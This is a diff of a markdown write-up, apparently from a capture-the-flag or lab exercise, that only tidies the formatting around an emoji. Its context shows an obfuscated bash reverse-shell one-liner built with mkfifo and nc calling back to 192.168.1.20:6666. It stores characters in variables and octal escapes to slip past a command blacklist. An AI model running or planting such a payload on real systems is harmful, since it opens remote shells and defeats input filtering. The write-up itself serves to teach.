@@ -60,9 +60,7 @@ It must be blacklisted, so after a long time of trying to craft a payload we com
 <br>
 </br>
 ``m=m;a=$'\046';s=$'\057';f=f;p=p;h=h;t=t;c=c;r${m}   ${s}tm${p}${s}f;mk${f}ifo   ${s}tm${p}${s}f;ca${t}  ${s}tm${p}${s}f|s${h}   -i  2>${a}1|n${c}    192.168.1.20    6666    >${s}tm${p}${s}f``
-We store characters in variables and then call them, that ways we bypass the blacklist on words, and we use the hex representation of symbols which is interpreted by bash and transformed to the symbol itself, you can try it yourself :\
-<br>
-</br>D , and we get a callback from the server:\
+We store characters in variables and then call them, that ways we bypass the blacklist on words, and we use the hex representation of symbols which is interpreted by bash and transformed to the symbol itself, you can try it yourself :D , and we get a callback from the server:\
 <br>
 </br> 
 ![img](images/image_2023-06-25_223318248.png)\
